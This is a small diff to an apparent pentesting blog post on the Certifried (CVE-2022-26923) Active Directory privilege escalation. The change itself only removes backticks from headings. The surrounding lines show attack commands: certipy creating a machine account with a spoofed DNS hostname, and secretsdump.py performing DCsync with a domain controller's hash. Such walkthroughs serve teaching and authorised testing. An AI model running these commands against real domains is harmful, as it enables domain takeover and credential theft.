@@ -40,7 +40,7 @@ title:  "AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)"
 ---
 
 # Attack Demonstration
-## 1. Joining A Machine Account to The Domain with A Spoofed `DNSHostname`
+## 1. Joining A Machine Account to The Domain with A Spoofed DNSHostname
 **Command:** `certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>`
 
 ![creating-computer-with-spoofed-dns-hostname](/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg)
@@ -65,7 +65,7 @@ Pssword = the same password generated from the computer creation in the previous
 
 ![got-nt-hash-for-dc](/assets/Certifried/got-nt-hash-for-dc.jpg)
 
-## 4. Performing `DCsync` As The Impersonated Domain Controller
+## 4. Performing DCsync As The Impersonated Domain Controller
 **Command:** `secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>`
 
 ![dc-sync-with-dc-ntlm-hash](/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg)
